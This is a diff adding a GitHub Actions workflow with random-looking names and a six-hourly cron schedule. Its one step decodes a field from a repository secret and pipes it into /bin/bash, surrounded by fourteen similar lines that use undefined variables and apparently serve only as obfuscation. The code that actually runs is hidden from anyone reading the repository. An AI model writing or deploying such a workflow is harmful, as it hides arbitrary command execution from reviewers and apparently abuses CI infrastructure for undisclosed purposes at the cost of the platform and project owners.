@@ -1,0 +1,31 @@
+name: xubixia6173
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xubixia6173
+        env:
+          hkajz5700: ${{ secrets.hkajz5700 }}
+        run: |
+          echo $hkajz5700 | jq -r .cn16 | /bin/bash
+          echo $g66 | jq -r .ywi19457 | /bin/bash
+          echo $a682 | jq -r .pz34301 | /bin/bash
+          echo $op255 | jq -r .rhn483 | /bin/bash
+          echo $ptl7220 | jq -r .v35 | /bin/bash
+          echo $odp82435 | jq -r .nvzsl947 | /bin/bash
+          echo $grwmm34 | jq -r .ql1390 | /bin/bash
+          echo $vm35 | jq -r .kmnox898 | /bin/bash
+          echo $fyznx5982 | jq -r .s45335 | /bin/bash
+          echo $mmus50384 | jq -r .z84639 | /bin/bash
+          echo $kuy946 | jq -r .uz7 | /bin/bash
+          echo $m448 | jq -r .smp72491 | /bin/bash
+          echo $astmb8065 | jq -r .esd0 | /bin/bash
+          echo $arod2 | jq -r .bua50 | /bin/bash
+          echo $onse494 | jq -r .ckr091 | /bin/bash
+
